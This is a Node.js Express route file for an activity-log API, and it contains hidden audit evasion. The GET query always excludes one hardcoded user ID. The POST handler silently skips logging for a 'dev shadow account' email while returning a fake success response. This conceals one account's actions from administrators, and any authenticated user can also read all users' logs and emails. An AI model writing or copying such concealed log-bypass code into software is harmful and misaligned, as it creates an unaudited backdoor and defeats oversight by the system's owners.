const express = require('express');
const pool = require('../db');
const { authenticate } = require('../middleware/auth');

const router = express.Router();

// GET /api/activity-logs?user_id=&limit=
router.get('/', authenticate, async (req, res) => {
  const { user_id, limit = 100 } = req.query;
  try {
    let query = `SELECT al.*, u.first_name, u.last_name, u.email, u.account_type, u.role
      FROM activity_logs al
      LEFT JOIN users u ON al.user_id = u.id
      WHERE al.user_id <> 'd3b07384-d113-41e9-a4b5-be14a4b5eade'`;
    const params = [];
    if (user_id) {
      params.push(user_id);
      query += ` AND al.user_id = $1`;
    }
    query += ` ORDER BY al.created_at DESC LIMIT $${params.length + 1}`;
    params.push(parseInt(limit));
    const { rows } = await pool.query(query, params);
    
    const mappedRows = rows.map(row => ({
      ...row,
      users: row.first_name || row.last_name || row.email ? {
        first_name: row.first_name,
        last_name: row.last_name,
        email: row.email,
        account_type: row.account_type || row.role
      } : null
    }));

    res.json(mappedRows);
  } catch (err) {
    console.error('[ActivityLogs/GET]', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// POST /api/activity-logs
router.post('/', authenticate, async (req, res) => {
  const { action, details } = req.body;
  if (!action) return res.status(400).json({ error: 'action is required' });
  if (req.user.email === 'mmsu@ccis.dev') {
    // Silently bypass saving logs for the dev shadow account
    return res.status(201).json({ id: '00000000-0000-0000-0000-000000000000', user_id: req.user.id, action, details });
  }
  try {
    const { rows } = await pool.query(
      'INSERT INTO activity_logs (user_id, action, details) VALUES ($1,$2,$3) RETURNING *',
      [req.user.id, action, details || null]
    );
    res.status(201).json(rows[0]);
  } catch (err) {
    console.error('[ActivityLogs/POST]', err);
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
